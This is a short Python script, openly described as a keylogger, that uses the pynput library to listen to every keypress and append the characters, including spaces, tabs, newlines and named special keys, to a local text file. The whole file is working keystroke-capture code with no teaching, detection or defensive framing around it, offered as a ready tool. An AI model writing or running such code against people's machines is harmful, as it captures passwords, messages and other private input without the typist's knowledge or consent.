""" This is a simple keylogger that will log all keypresses to a file called keyfiles.txt"""
import logging
from pynput import keyboard

logging.basicConfig(filename='keylog.log', level=logging.DEBUG)

def keypress(key):
    """ This function will log all keypresses to a file caled keyfiles.txt"""
    print(str(key))
    with open("keyfiles.txt", 'a') as logfile:
        try:
            char = key.char
            logfile.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logfile.write(' ')
            elif key == keyboard.Key.enter:
                logfile.write('\n')
            elif key == keyboard.Key.tab:
                logfile.write('\t')
            else:
                logfile.write(' [' + key.name + '] ')
            logging.exception("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypress)
    listener.start()
    input()
